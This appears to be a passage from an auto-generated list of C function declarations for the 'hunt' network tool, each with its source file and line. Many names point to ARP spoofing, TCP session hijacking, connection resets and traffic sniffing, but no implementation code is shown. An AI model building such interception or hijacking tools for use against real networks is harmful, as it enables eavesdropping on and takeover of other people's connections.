void f_hijack_sync(struct packet *p, struct conn_info *ci);
// fast_ack_to_dst
// file hijack.c line 69
void fast_ack_to_dst(struct packet *p, struct conn_info *ci);
// fast_tcp_process
// file hunt.c line 634
static inline void fast_tcp_process(struct packet *p);
// fclose
// file /usr/include/stdio.h line 237
extern signed int fclose(struct _IO_FILE *);
// fflush
// file /usr/include/stdio.h line 242
extern signed int fflush(struct _IO_FILE *);
// fgets
// file /usr/include/stdio.h line 622
extern char * fgets(char *, signed int, struct _IO_FILE *);
// fill_space_to
// file hunt.c line 911
static signed int fill_space_to(char *b, signed int pos, signed int where);
// fill_uci
// file hunt.c line 159
static inline void fill_uci(struct user_conn_info *uci, struct packet *p);
// find_asi_dst_mac
// file arpspoof.c line 1353
static signed int find_asi_dst_mac(struct arp_spoof_info *asi, char *error_label);
// finish_c_handler
// file main.c line 436
void finish_c_handler(signed int sig);
// fopen
// file /usr/include/stdio.h line 272
extern struct _IO_FILE * fopen(const char *, const char *);
// force_arp_spoof
// file arpspoof.c line 501
void force_arp_spoof(struct arp_spoof_info *asi, signed int count);
// fork
// file /usr/include/unistd.h line 756
extern signed int fork(void);
// fprintf
// file /usr/include/stdio.h line 356
extern signed int fprintf(struct _IO_FILE *, const char *, ...);
// fputc
// file /usr/include/stdio.h line 573
extern signed int fputc(signed int, struct _IO_FILE *);
// fputs
// file /usr/include/stdio.h line 689
extern signed int fputs(const char *, struct _IO_FILE *);
// free
// file /usr/include/stdlib.h line 483
extern void free(void *);
// free_sniff_info
// file sniff.c line 106
void free_sniff_info(struct sniff_info *si);
// free_sniff_log
// file sniff.c line 97
void free_sniff_log(struct sniff_log *slog);
// func_arp
// file arpspoof.c line 179
static void func_arp(struct packet *p, void *arg);
// func_arp_packet
// file hostup.c line 49
static void func_arp_packet(struct packet *p, void *arg);
// func_dump_connection_dst
// file main.c line 78
void func_dump_connection_dst(struct packet *p, struct user_conn_info *arg);
// func_dump_connection_src
// file main.c line 89
void func_dump_connection_src(struct packet *p, struct user_conn_info *arg);
// func_hijack_dst
// file hijack.c line 44
void func_hijack_dst(struct packet *p, struct conn_info *arg);
// func_hijack_dst_sync
// file synchijack.c line 22
void func_hijack_dst_sync(struct packet *p, struct conn_info *arg);
// func_hijack_src
// file hijack.c line 55
void func_hijack_src(struct packet *p, struct conn_info *arg);
// func_hijack_src_sync
// file synchijack.c line 47
void func_hijack_src_sync(struct packet *p, struct conn_info *arg);
// func_icmp_packet
// file hostup.c line 35
static void func_icmp_packet(struct packet *p, void *arg);
// func_relay
// file arpspoof.c line 598
static void func_relay(struct packet *p, void *arg);
// func_sniff
// file sniff.c line 187
static void func_sniff(struct packet *p, void *arg);
// func_tcp_packet
// file rstd.c line 78
static void func_tcp_packet(struct packet *p, void *arg);
// generate_key
// file hunt.h line 294
static inline unsigned int generate_key(unsigned long int saddr, unsigned long int daddr, unsigned short int source, unsigned short int dest);
// generate_key_link1
// file hunt.h line 294
static inline unsigned int generate_key_link1(unsigned long int saddr_link1, unsigned long int daddr_link1, unsigned short int source_link1, unsigned short int dest_link1);
// get_arp_spoof
// file hunt.h line 524
struct arp_spoof_info * get_arp_spoof(unsigned int src_addr, unsigned int dst_addr);
// get_asi
// file arpspoof.c line 310
static struct arp_spoof_info * get_asi(unsigned int src_addr, unsigned int dst_addr);
// get_ifc_info
// file tap.c line 110
signed int get_ifc_info(char *ifc_name, unsigned int *ip, char *mac);
// getchar
// file /usr/include/x86_64-linux-gnu/bits/stdio.h line 44
static inline signed int getchar(void);
// getchar_link1
// file /usr/include/x86_64-linux-gnu/bits/stdio.h line 44
static inline signed int getchar_link1(void);
// geteuid
// file /usr/include/unistd.h line 678
extern unsigned int geteuid(void);
// gethostbyaddr
// file /usr/include/netdb.h line 137
extern struct hostent * gethostbyaddr(const void *, unsigned int, signed int);
// gethostbyname
// file /usr/include/netdb.h line 144
extern struct hostent * gethostbyname(const char *);
// getopt
// file /usr/include/getopt.h line 150
extern signed int getopt(signed int, char * const *, const char *);
// getpid
// file /usr/include/unistd.h line 628
extern signed int getpid(void);
// getppid
// file /usr/include/unistd.h line 631
extern signed int getppid(void);
// getservbyname
// file /usr/include/netdb.h line 290
extern struct servent * getservbyname(const char *, const char *);
// getservbyport
// file /usr/include/netdb.h line 297
extern struct servent * getservbyport(signed int, const char *);
// gettimeofday
// file /usr/include/x86_64-linux-gnu/sys/time.h line 71
extern signed int gettimeofday(struct timeval *, struct timezone *);
// getuid
// file /usr/include/unistd.h line 675
extern unsigned int getuid(void);
// handle_response
// file resolv.c line 329
static void handle_response(signed int fd, struct slave *sl);
// hash_count
// file c/hash.h line 59
signed int hash_count(struct hash *h);
// hash_free
// file c/hash.c line 65
void hash_free(struct hash *h);
// hash_get
// file c/hash.h line 52
void * hash_get(struct hash *h, unsigned int key, void *arg);
// hash_init
// file c/hash.h line 50
signed int hash_init(struct hash *h, signed int max_items, signed int (*eqfunc)(unsigned int, void *, void *));
// hash_init::eqfunc_object
//
signed int eqfunc_object(unsigned int, void *, void *);
// hash_iter_end
// file c/hash.h line 68
void hash_iter_end(struct hash_iterator *i);
// hash_iter_get
// file c/hash.h line 67
void * hash_iter_get(struct hash_iterator *i, unsigned int *keyptr);
// hash_iter_lock
// file c/hash.c line 373
void hash_iter_lock(struct hash_iterator *i);
// hash_iter_set
// file c/hash.h line 66
void hash_iter_set(struct hash_iterator *i, struct hash *h);
// hash_iter_unlock
// file c/hash.c line 378
void hash_iter_unlock(struct hash_iterator *i);
// hash_lock
// file c/hash.h line 57
void hash_lock(struct hash *h);
// hash_put
// file c/hash.h line 54
signed int hash_put(struct hash *h, unsigned int key, void *data);
// hash_put_check
// file c/hash.c line 315
signed int hash_put_check(struct hash *h, unsigned int key, void *data, void *arg);
// hash_remove
// file c/hash.h line 53
void * hash_remove(struct hash *h, unsigned int key, void *arg);
// hash_unlock
// file c/hash.h line 58
void hash_unlock(struct hash *h);
// hijack_sync
// file synchijack.c line 461
signed int hijack_sync(struct conn_info *ci);
// hijack_sync_init_msg
// file synchijack.c line 123
static void hijack_sync_init_msg(struct conn_info *ci);
// host_lookup
// file hunt.h line 452
char * host_lookup(unsigned int in, signed int use_mode);
// host_up
// file hunt.h line 614
void host_up(void);
// ht_eq
// file hunt.c line 184
static signed int ht_eq(unsigned int key, struct conn_info *c, struct user_conn_info *uci);
// hunt
// file hunt.c line 728
void * hunt(void *arg);
// hunt_arpspoof_test
// file arpspoof.c line 1339
static void hunt_arpspoof_test(struct packet *p, void *arg);
// in_cksum
// file hunt.h line 420
unsigned short int in_cksum(unsigned short int *ptr, signed int nbytes);
// inet_ntoa
// file /usr/include/arpa/inet.h line 53
extern char * inet_ntoa(struct in_addr);
// init_modules
// file main.c line 409
static void init_modules(void);
// int_to_sdb
// file menu.c line 579
char int_to_sdb(signed int mode);
// ioctl
// file /usr/include/x86_64-linux-gnu/sys/ioctl.h line 41
extern signed int ioctl(signed int, unsigned long int, ...);
// ip_in_cksum
// file hunt.h line 419
unsigned short int ip_in_cksum(struct iphdr *iph, unsigned short int *ptr, signed int nbytes);
// is_icmp_reply
// file net.c line 183
signed int is_icmp_reply(struct packet *p, unsigned int src_addr, unsigned int dst_addr, char *src_mac, char *dst_mac);
// is_power2
// file util.c line 65
signed int is_power2(unsigned int i);
// kill
// file /usr/include/signal.h line 127
extern signed int kill(signed int, signed int);
// lines_o_press_key
// file hunt.h line 609
void lines_o_press_key(void);
// list_at
// file c/list.c line 226
void * list_at(struct list *l, signed int nr);
// list_conn_properties
// file options.c line 17
static void list_conn_properties(void);
// list_connections
// file main.c line 32
void list_connections(void);
// list_consume
// file c/list.h line 77
void * list_consume(struct list *l, struct timespec *absts);
// list_consume_rel
// file c/list.c line 201
void * list_consume_rel(struct list *l, struct timespec *relts);
// list_count
// file c/list.h line 84
signed int list_count(struct list *l);
// list_enqueue
// file c/list.h line 70
void list_enqueue(struct list *l, void *m);
// list_flush
// file c/list.c line 46
void list_flush(struct list *l);
// list_host_promisc
// file hostup.c line 210
static void list_host_promisc(struct host_up_info *hui, signed int *promisc);
// list_host_up
// file hostup.c line 195
static void list_host_up(struct host_up_info *hui, signed int *up);
// list_init
// file c/list.c line 16
void list_init(struct list *l, signed int next_offset);
// list_insert_at
// file c/list.c line 88
void list_insert_at(struct list *l, signed int nr, void *m);
// list_iter_end
// file c/list.h line 91
void list_iter_end(struct list_iterator *i);
// list_iter_get
// file c/list.h line 90
void * list_iter_get(struct list_iterator *i);
// list_iter_set
// file c/list.h line 89
void list_iter_set(struct list_iterator *i, struct list *l);
// list_lock
// file c/list.h line 86
void list_lock(struct list *l);
// list_peek
// file c/list.c line 216
void * list_peek(struct list *l);
// list_pop
// file c/list.h line 76
void * list_pop(struct list *l);
// list_produce
// file c/list.h line 71
void list_produce(struct list *l, void *m);
// list_produce_done
// file c/list.c line 130
void list_produce_done(struct list *l);
// list_produce_start
// file c/list.h line 72
void list_produce_start(struct list *l);
// list_push
// file c/list.h line 69
void list_push(struct list *l, void *m);
// list_remove
// file c/list.h line 81
void * list_remove(struct list *l, void *m);
// list_remove_at
// file c/list.c line 295
void * list_remove_at(struct list *l, signed int nr);
// list_remove_func
// file c/list.c line 300
void * list_remove_func(struct list *l, signed int (*func)(signed int, void *, void *), void *m);
// list_remove_func::func_object
//
signed int func_object(signed int, void *, void *);
// list_unlock
// file c/list.h line 87
void list_unlock(struct list *l);
// log2
// file util.c line 73
signed int log2(unsigned int i);
// logo
// file main.c line 23
void logo(void);
// mac_arp_learn
// file hunt.c line 685
static void mac_arp_learn(struct packet *p);
// mac_disc_menu
// file hunt.h line 577
void mac_disc_menu(void);
// mac_disc_thr
// file macdisc.c line 81
static void * mac_disc_thr(void *arg);
// mac_discover
// file macdisc.c line 34
void mac_discover(unsigned int ip, signed int count);
// mac_discover_range
// file macdisc.c line 17
void mac_discover_range(unsigned int start_ip, unsigned int end_ip, signed int count);
// mac_info_get
// file hunt.c line 668
struct mac_info * mac_info_get(unsigned int ip);
// mac_info_release
// file hunt.c line 680
void mac_info_release(struct mac_info *mi);
// mac_ip_learn
// file hunt.c line 704
static void mac_ip_learn(struct packet *p);
// mac_learn_from_ip_opt
// file options.c line 74
static void mac_learn_from_ip_opt(void);
// mac_table_update
// file hunt.c line 647
static void mac_table_update(unsigned int ip, char *mac);
// main_reset
// file main.c line 441
void main_reset(void);
// malloc
// file /usr/include/stdlib.h line 466
extern void * malloc(unsigned long int);
// mdi_add
// file macdisc.c line 182
static void mdi_add(void);
// mdi_del
// file macdisc.c line 218
static void mdi_del(void);
// mdi_list
// file macdisc.c line 165
static void mdi_list(void);
// mdi_mod
// file macdisc.c line 198
static void mdi_mod(void);
// mdi_time_wait
// file macdisc.c line 232
static void mdi_time_wait(void);
// memchr
// file /usr/include/string.h line 96
extern void * memchr(const void *, signed int, unsigned long int);
// memcmp
// file /usr/include/string.h line 69
extern signed int memcmp(const void *, const void *, unsigned long int);
// memcpy
// file /usr/include/string.h line 46
extern void * memcpy(void *, const void *, unsigned long int);
// memfind
// file sniff.c line 261
char * memfind(char *data, signed int data_len, char *str, signed int str_len);
// memset
// file /usr/include/string.h line 66
extern void * memset(void *, signed int, unsigned long int);
// menu
// file hunt.h line 361
signed int menu(char *head, char *str_menu, char *label, char *opt, char dfl);
// menu_choose_char
// file hunt.h line 358
signed int menu_choose_char(char *label, char *opt, char dfl);
// menu_choose_char_nconn
// file menu.c line 406
signed int menu_choose_char_nconn(char *label, char *opt, char dfl, signed int conn_ind);
// menu_choose_host_mask_ports
// file menu.c line 286
signed int menu_choose_host_mask_ports(char *label, unsigned int *ret_ip, unsigned int *ret_mask, unsigned int *ret_ports, char *dfl);
// menu_choose_host_mask_ports_dfl
// file menu.c line 337
signed int menu_choose_host_mask_ports_dfl(char *label, unsigned int *ret_ip, unsigned int *ret_mask, unsigned int *ret_ports, unsigned int dfl_ip, unsigned int dfl_mask, signed int *dfl_ports);
// menu_choose_hostname
// file menu.c line 259
unsigned int menu_choose_hostname(char *label, char *dfl);
// menu_choose_mac
// file hunt.h line 365
signed int menu_choose_mac(char *label, unsigned char *mac_ret, char *dfl);
// menu_choose_ports
// file menu.c line 274
signed int menu_choose_ports(char *label, signed int *ret_ports, char *dfl);
// menu_choose_sdb
// file hunt.h line 366
signed int menu_choose_sdb(char *label, char dfl);
// menu_choose_string
// file menu.c line 472
signed int menu_choose_string(char *label, char *ret_buf, signed int buf_len, char *dfl);
// menu_choose_unr
// file hunt.h line 357
signed int menu_choose_unr(char *label, signed int min, signed int max, signed int dfl);
// menu_choose_yn
// file menu.c line 454
signed int menu_choose_yn(char *label, signed int dfl);
// menu_prompt
// file menu.c line 21
static signed int menu_prompt(char *label, char *buf, signed int buf_size, char *dfl);
// mkdir
// file /usr/include/x86_64-linux-gnu/sys/stat.h line 320
extern signed int mkdir(const char *, unsigned int);
// nanosleep
// file /usr/include/time.h line 334
extern signed int nanosleep(struct timespec *, struct timespec *);
// need_read_positive
// file synchijack.c line 298
static void need_read_positive(struct packet *p, struct conn_info *ci);
// need_read_write_init
// file synchijack.c line 190
static void need_read_write_init();
// need_read_write_negative
// file synchijack.c line 196
static void need_read_write_negative(struct conn_info *ci);
// need_space
// file c/array.c line 120
static void need_space(struct array *a);
// need_write_positive
// file synchijack.c line 237
static void need_write_positive(struct conn_info *ci, char *data, signed int data_len);
// newline_option
// file sniff.c line 816
void newline_option(void);
// open
// file /usr/include/fcntl.h line 146
extern signed int open(const char *, signed int, ...);
// options_menu
// file hunt.h line 608
void options_menu(void);
// packet_copy_data
// file hunt.c line 89
void packet_copy_data(struct packet *dst, struct packet *src);
// packet_count
// file hunt.c line 149
signed int packet_count(void);
// packet_flush
// file hunt.c line 130
void packet_flush(struct list *l);
// packet_free
// file hunt.c line 109
void packet_free(struct packet *p);
// packet_match
// file hunt.c line 270
static signed int packet_match(struct packet_info *pi, struct packet *p);
// packet_match_db
// file rstd.c line 59
static struct rst_db_item * packet_match_db(struct packet *p);
// packet_match_db_item
// file rstd.c line 39
static inline signed int packet_match_db_item(struct packet *p, struct rst_db_item *dbi);
// packet_match_relay
// file pktrelay.c line 119
static struct relay_item * packet_match_relay(struct packet *p);
// packet_match_relay_item
// file pktrelay.c line 105
static inline signed int packet_match_relay_item(struct packet *p, struct relay_item *ri);
// packet_new
// file hunt.c line 66
struct packet * packet_new(void);
// packet_preallocate
// file hunt.c line 138
void packet_preallocate(signed int count);
// packet_want
// file hunt.c line 123
void packet_want(struct packet *p);
// parse_hostname
// file menu.c line 120
unsigned int parse_hostname(char *buf);
// parse_mac
// file menu.c line 173
signed int parse_mac(char *buf, char *mac_ret);
// parse_ports
// file menu.c line 58
signed int parse_ports(char *buf, unsigned int *ret_ports);
// parse_unr
// file menu.c line 46
signed int parse_unr(char *buf, signed int min, signed int max);
// perform_arp
// file hostup.c line 139
static void perform_arp(struct host_up_info *hui, signed int count, signed int *up, unsigned char *fake_mac);
// perform_ping
// file hostup.c line 66
static void perform_ping(struct host_up_info *hui, signed int count, signed int *up, unsigned char *fake_mac);
// perror
// file /usr/include/stdio.h line 846
extern void perror(const char *);
// port_htons
// file util.c line 334
void port_htons(unsigned int *db_ports);
// port_lookup
// file hunt.h line 453
char * port_lookup(unsigned short int serv, signed int use_mode);
// port_match
// file util.c line 306
signed int port_match(signed int port, unsigned int *db_ports);
// press_key
// file hunt.h line 362
void press_key(char *label);
// print_arp_relayer_daemon
// file hunt.h line 527
void print_arp_relayer_daemon(void);
// print_cntrl_chars_setup
// file options.c line 180
static void print_cntrl_chars_setup(void);
// print_colors
// file util.c line 42
void print_colors();
// print_data
// file util.c line 154
void print_data(char *label, void *data, signed int len);
// print_data_packet
// file hunt.h line 414
void print_data_packet(struct packet *p, signed int data_len, signed int count, signed int dst_packet);
// print_eth_mac
// file util.c line 229
signed int print_eth_mac(unsigned char *mac);
// print_host_properties
// file options.c line 59
static void print_host_properties(void);
// print_mac_daemon
// file hunt.h line 578
void print_mac_daemon();
// print_mac_table
// file hunt.c line 1005
void print_mac_table(void);
// print_new_conn_ind
// file hunt.h line 375
void print_new_conn_ind(signed int add_new);
// print_relay_packet
// file arpspoof.c line 668
static void print_relay_packet(const char *label, struct packet *p, signed int print_mac);
// print_rst_daemon
// file hunt.h line 563
void print_rst_daemon(void);
// print_sniff_daemon
// file hunt.h line 570
void print_sniff_daemon(void);
// print_tcp
// file hunt.c line 903
void print_tcp(struct packet *p, struct iphdr *ip, struct tcphdr *tcp);
// print_user_conn_info
// file hunt.c line 1024
void print_user_conn_info(struct user_conn_info *uci, signed int count);
// printed_lines_per_page
// file options.c line 162
static void printed_lines_per_page(void);
// printf
// file /usr/include/stdio.h line 362
extern signed int printf(const char *, ...);
// process_arp
// file hunt.c line 597
static void process_arp(struct packet *p);
// process_icmp
// file hunt.c line 586
static void process_icmp(struct packet *p);
// process_ip
// file hunt.c line 608
static void process_ip(struct packet *p);
// process_pktrelay
// file hunt.h line 620
signed int process_pktrelay(struct packet *p, struct arp_spoof_info *asi);
// process_tcp
// file hunt.c line 564
static void process_tcp(struct packet *p);
// process_udp
// file hunt.c line 575
static void process_udp(struct packet *p);
// pthread_cond_broadcast
// file /usr/include/pthread.h line 983
extern signed int pthread_cond_broadcast(union anonymous_4 *);
// pthread_cond_destroy
// file /usr/include/pthread.h line 975
extern signed int pthread_cond_destroy(union anonymous_4 *);
// pthread_cond_init
// file /usr/include/pthread.h line 970
extern signed int pthread_cond_init(union anonymous_4 *, const union anonymous_9 *);
// pthread_cond_signal
// file /usr/include/pthread.h line 979
extern signed int pthread_cond_signal(union anonymous_4 *);
// pthread_cond_timedwait
// file /usr/include/pthread.h line 1002
extern signed int pthread_cond_timedwait(union anonymous_4 *, union anonymous_2 *, struct timespec *);
// pthread_cond_wait
// file /usr/include/pthread.h line 991
extern signed int pthread_cond_wait(union anonymous_4 *, union anonymous_2 *);
// pthread_create
// file /usr/include/pthread.h line 235
extern signed int pthread_create(unsigned long int *, const union pthread_attr_t *, void * (*)(void *), void *);
// pthread_join
// file /usr/include/pthread.h line 252
extern signed int pthread_join(unsigned long int, void **);
// pthread_kill
// file /usr/include/x86_64-linux-gnu/bits/sigthread.h line 35
extern signed int pthread_kill(unsigned long int, signed int);
// pthread_mutex_destroy
// file /usr/include/pthread.h line 756
extern signed int pthread_mutex_destroy(union anonymous_2 *);
// pthread_mutex_init
// file /usr/include/pthread.h line 751
extern signed int pthread_mutex_init(union anonymous_2 *, const union anonymous_9 *);
// pthread_mutex_lock
// file /usr/include/pthread.h line 764
extern signed int pthread_mutex_lock(union anonymous_2 *);
// pthread_mutex_unlock
// file /usr/include/pthread.h line 775
extern signed int pthread_mutex_unlock(union anonymous_2 *);
// pthread_self
// file /usr/include/pthread.h line 277
extern unsigned long int pthread_self(void);
// pthread_sigmask
// file /usr/include/x86_64-linux-gnu/bits/sigthread.h line 30
extern signed int pthread_sigmask(signed int, const struct anonymous_3 *, struct anonymous_3 *);
// putchar
// file /usr/include/x86_64-linux-gnu/bits/stdio.h line 79
static inline signed int putchar(signed int __c);
// putchar_link1
// file /usr/include/x86_64-linux-gnu/bits/stdio.h line 79
static inline signed int putchar_link1(signed int __c_link1);
// rawsock
// file util.c line 237
signed int rawsock(void);
// read
// file /usr/include/unistd.h line 360
extern signed long int read(signed int, void *, unsigned long int);
// realloc
// file /usr/include/stdlib.h line 480
extern void * realloc(void *, unsigned long int);
// recv
// file /usr/include/x86_64-linux-gnu/sys/socket.h line 156
extern signed long int recv(signed int, void *, unsigned long int, signed int);
// register_timejob
// file timer.c line 65
void register_timejob(struct timejob *tj);
// register_timejob_milsec_rel
// file hunt.h line 644
void register_timejob_milsec_rel(struct timejob *tj, signed int milsec);
// register_timejob_rel
// file hunt.h line 643
void register_timejob_rel(struct timejob *tj, signed int relsec);
// relay_add_item
// file pktrelay.c line 257
static void relay_add_item(void);
// relay_del_item
// file pktrelay.c line 402
static void relay_del_item(void);
// relay_item_print
// file pktrelay.c line 217
static void relay_item_print(signed int i, struct relay_item *ri);
// relay_list_items
// file pktrelay.c line 241
static void relay_list_items(void);
// relay_menu
// file hunt.h line 619
void relay_menu(void);
// relay_mod_item
// file pktrelay.c line 316
static void relay_mod_item(void);
// relay_modify_hook
// file arpspoof.c line 701
static void relay_modify_hook(struct packet *p_new);
// remove_conn_if_dont_match
// file hunt.c line 201
void remove_conn_if_dont_match(void);
// remove_idle_slaves
// file resolv.c line 291
static void remove_idle_slaves(struct list *slaves);
// reset_connection
// file main.c line 207
void reset_connection(void);
// resolv_daemon
// file resolv.c line 346
static void resolv_daemon(signed int fd);
// resolv_done
// file hunt.h line 457
void resolv_done(void);
// resolv_get
// file resolv.c line 79
struct resolv_item * resolv_get(unsigned int ip);
// resolv_init
// file hunt.h line 456
void resolv_init(void);
// resolv_put
// file resolv.c line 65
void resolv_put(unsigned int ip, const char *name);
// resolv_release
// file resolv.c line 92
void resolv_release(struct resolv_item *r);
// resolv_remove
// file resolv.c line 53
void resolv_remove(unsigned int ip);
// resolv_request
// file resolv.c line 97
void resolv_request(unsigned int ip);
// resolv_slave
// file resolv.c line 178
static void resolv_slave(signed int fd);
// ri_allocate
// file pktrelay.c line 78
static struct relay_item * ri_allocate();
// ri_free
// file pktrelay.c line 91
static void ri_free(struct relay_item *ri);
// ri_release
// file pktrelay.c line 62
static void ri_release(struct relay_item *ri);
// ri_wait_for_release
// file pktrelay.c line 70
static void ri_wait_for_release(struct relay_item *ri);
// ri_want
// file pktrelay.c line 55
static void ri_want(struct relay_item *ri);
// rst
// file rst.c line 50
void rst(struct conn_info *ci, signed int count, signed int rstdst);
// rst_add_item
// file rstd.c line 254
static void rst_add_item(void);
// rst_daemon_start
// file rstd.c line 168
static void rst_daemon_start(void);
// rst_daemon_stop
// file rstd.c line 184
static void rst_daemon_stop(void);
// rst_daemon_thr
// file rstd.c line 91
static void * rst_daemon_thr(void *arg);
// rst_del_item
// file rstd.c line 346
static void rst_del_item(void);
// rst_list_items
// file rstd.c line 238
static void rst_list_items(void);
// rst_mod_item
// file rstd.c line 299
static void rst_mod_item(void);
// rstd_menu
// file hunt.h line 562
void rstd_menu(void);
// run_arpspoof_intr
// file arpspoof.c line 1436
static void run_arpspoof_intr(signed int sig);
// run_arpspoof_until_successed
// file arpspoof.c line 1458
signed int run_arpspoof_until_successed(struct arp_spoof_info *asi);
// sdb_to_int
// file menu.c line 600
signed int sdb_to_int(char mode);
// sdbmode_to_char
// file menu.c line 621
char * sdbmode_to_char(signed int mode);
// sec_nanosleep
// file hunt.h line 718
static inline void sec_nanosleep(signed int sec);
// select
// file /usr/include/x86_64-linux-gnu/sys/select.h line 106
extern signed int select(signed int, struct anonymous_29 *, struct anonymous_29 *, struct anonymous_29 *, struct timeval *);
// send_arp_message
// file hostup.c line 121
static void send_arp_message(unsigned int ip, char *dst_mac);
// send_arp_packet
// file net.c line 209
signed int send_arp_packet(struct arp_spec *as);
// send_icmp_packet
// file net.c line 99
signed int send_icmp_packet(struct icmp_spec *is);
// send_icmp_request
// file net.c line 164
void send_icmp_request(unsigned int src_addr, unsigned int dst_addr, char *src_mac, char *dst_mac, unsigned short int seq);
// send_packet
// file net.c line 266
signed int send_packet(struct packet *p);
// send_req_to_slave
// file resolv.c line 240
static void send_req_to_slave(signed int fd, struct list *slaves, struct list *requests);
// send_src_spoof_to_dst
// file arpspoof.c line 76
static void send_src_spoof_to_dst(struct arp_spoof_info *asi);
// send_src_spoof_to_dst_through_request
// file arpspoof.c line 108
static void send_src_spoof_to_dst_through_request(struct arp_spoof_info *asi, unsigned int ask_addr);
// send_tcp_packet
// file net.c line 37
signed int send_tcp_packet(struct tcp_spec *ts);
// sendmsg
// file /usr/include/x86_64-linux-gnu/sys/socket.h line 184
extern signed long int sendmsg(signed int, struct msghdr *, signed int);
// service_lookup
// file hunt.h line 454
unsigned short int service_lookup(char *name);
// set_tty_color
// file hunt.h line 406
void set_tty_color(enum TTY_COLOR color);
// set_tty_color_bg
// file util.c line 57
void set_tty_color_bg(enum TTY_COLOR fg, enum TTY_COLOR bg);
// setpriority
// file /usr/include/x86_64-linux-gnu/sys/resource.h line 97
extern signed int setpriority(signed int, unsigned int, signed int);
// setsockopt
// file /usr/include/x86_64-linux-gnu/sys/socket.h line 226
extern signed int setsockopt(signed int, signed int, signed int, const void *, unsigned int);
// sig_slave_term
// file resolv.c line 173
static void sig_slave_term(signed int signum);
// sig_term
// file resolv.c line 235
static void sig_term(signed int signum);
// sigaction
// file /usr/include/signal.h line 259
extern signed int sigaction(signed int, struct sigaction *, struct sigaction *);
// sigaddset
// file /usr/include/signal.h line 221
extern signed int sigaddset(struct anonymous_3 *, signed int);
// sigemptyset
// file /usr/include/signal.h line 215
extern signed int sigemptyset(struct anonymous_3 *);
// siglongjmp
// file /usr/include/setjmp.h line 102
extern void siglongjmp(struct __jmp_buf_tag *, signed int);
// sigprocmask
// file /usr/include/signal.h line 248
extern signed int sigprocmask(signed int, const struct anonymous_3 *, struct anonymous_3 *);
// simple_hijack
// file main.c line 231
void simple_hijack(void);
// sniff_add_item
// file sniff.c line 650
static void sniff_add_item(void);
// sniff_daemon_init
// file sniff.c line 502
static signed int sniff_daemon_init(void);
// sniff_del_item
// file sniff.c line 799
static void sniff_del_item(void);
// sniff_info_release
// file sniff.c line 80
static void sniff_info_release(struct sniff_info *si);
// sniff_info_wait_for_release
// file sniff.c line 88
static void sniff_info_wait_for_release(struct sniff_info *si);
// sniff_info_want
// file sniff.c line 73
static void sniff_info_want(struct sniff_info *si);
// sniff_item_log_print
// file sniff.c line 596
static void sniff_item_log_print(struct _IO_FILE *f, signed int *l_nr, struct sniff_info *si);
// sniff_item_print
// file sniff.c line 119
static void sniff_item_print(struct _IO_FILE *f, signed int i, struct sniff_info *si);
// sniff_list_db
// file sniff.c line 631
static void sniff_list_db(signed int all);
// sniff_log_item_print
// file sniff.c line 144
static void sniff_log_item_print(struct _IO_FILE *f, struct sniff_info *si, struct sniff_log *slog);
// sniff_log_match
// file sniff.c line 293
char * sniff_log_match(struct packet *p, struct sniff_info *si, struct sniff_log *slog);
// sniff_menu
// file hunt.h line 569
void sniff_menu(void);
// sniff_mod_item
// file sniff.c line 729
static void sniff_mod_item(void);
// sniff_options
// file sniff.c line 831
void sniff_options(void);
// sniff_packet_match
// file sniff.c line 165
static inline signed int sniff_packet_match(struct packet *p, struct sniff_info *si);
// sniffer
// file sniff.c line 478
static void * sniffer(void *arg);
// sniffer_log
// file sniff.c line 434
void sniffer_log(char *data, struct packet *p, struct sniff_info *si, struct sniff_log *slog);
// sniffer_log_print
// file sniff.c line 215
void sniffer_log_print(struct sniff_info *si, struct sniff_log *slog);
// sniffer_match
// file sniff.c line 357
char * sniffer_match(struct packet *p, struct sniff_info *si, struct sniff_log **__slog);
// socket
// file /usr/include/x86_64-linux-gnu/sys/socket.h line 113
extern signed int socket(signed int, signed int, signed int);
// socketpair
// file /usr/include/x86_64-linux-gnu/sys/socket.h line 119
extern signed int socketpair(signed int, signed int, signed int, signed int *);
// sprintf
// file /usr/include/stdio.h line 364
extern signed int sprintf(char *, const char *, ...);
// sprintf_db_ports
// file util.c line 280
signed int sprintf_db_ports(unsigned int *ports, char *buf, signed int buf_size, signed int all);
// sprintf_eth_mac
// file hunt.h line 422
signed int sprintf_eth_mac(char *b, unsigned char *mac);
// start_arp_relayer
// file arpspoof.c line 808
static signed int start_arp_relayer(void);
// start_arp_spoof
// file hunt.h line 520
struct arp_spoof_info * start_arp_spoof(unsigned int src_addr, unsigned int dst_addr, char *src_mac, char *dst_mac, char *src_fake_mac, signed int refresh, signed int can_forward, signed int in_range);
// start_arp_spoof_range
// file arpspoof.c line 865
static signed int start_arp_spoof_range(struct arp_spoof_range *asr);
// start_mac_discovery
// file macdisc.c line 117
static signed int start_mac_discovery(void);
// start_sniff
// file sniff.c line 526
static void start_sniff(void);
// stat
// file /usr/include/x86_64-linux-gnu/sys/stat.h line 452
static inline signed int stat(const char *__path, struct stat *__statbuf);
// stop_arp_relayer
// file arpspoof.c line 824
static signed int stop_arp_relayer(void);
// stop_arp_spoof
// file hunt.h line 525
void stop_arp_spoof(struct arp_spoof_info *asi);
// stop_arp_spoof_range
// file arpspoof.c line 907
static void stop_arp_spoof_range(struct arp_spoof_range *asr);
// stop_mac_discovery
// file macdisc.c line 131
static signed int stop_mac_discovery(void);
// stop_sniff
// file sniff.c line 543
static void stop_sniff(void);
// storm_reset_sec_setup
// file options.c line 89
static void storm_reset_sec_setup(void);
// stormack_hijack
// file hijack.c line 202
signed int stormack_hijack(struct conn_info *ci, char *cmdbuf);
// stormack_hijack_wait_sec_setup
// file options.c line 98
static void stormack_hijack_wait_sec_setup(void);
// strcat
// file /usr/include/string.h line 137
extern char * strcat(char *, const char *);
// strcpy
// file /usr/include/string.h line 129
extern char * strcpy(char *, const char *);
// strlen
// file /usr/include/string.h line 398
extern unsigned long int strlen(const char *);
// strncasecmp
// file /usr/include/string.h line 537
extern signed int strncasecmp(const char *, const char *, unsigned long int);
// strrchr
// file /usr/include/string.h line 262
extern char * strrchr(const char *, signed int);
// strtok
// file /usr/include/string.h line 347
extern char * strtok(char *, const char *);
// strtol
// file /usr/include/stdlib.h line 183
extern signed long int strtol(const char *, char ** restrict , signed int);
// suggest_mac
// file hunt.h line 431
unsigned char * suggest_mac(void);
// suggest_mac_setup
// file options.c line 48
static void suggest_mac_setup(void);
// suggest_sync_msg
// file synchijack.c line 90
static char * suggest_sync_msg(signed int first);
// tap
// file hunt.h line 423
signed int tap(char *device, signed int promisc_mode);
// tcgetattr
// file /usr/include/termios.h line 66
extern signed int tcgetattr(signed int, struct termios *);
// tcsetattr
// file /usr/include/termios.h line 70
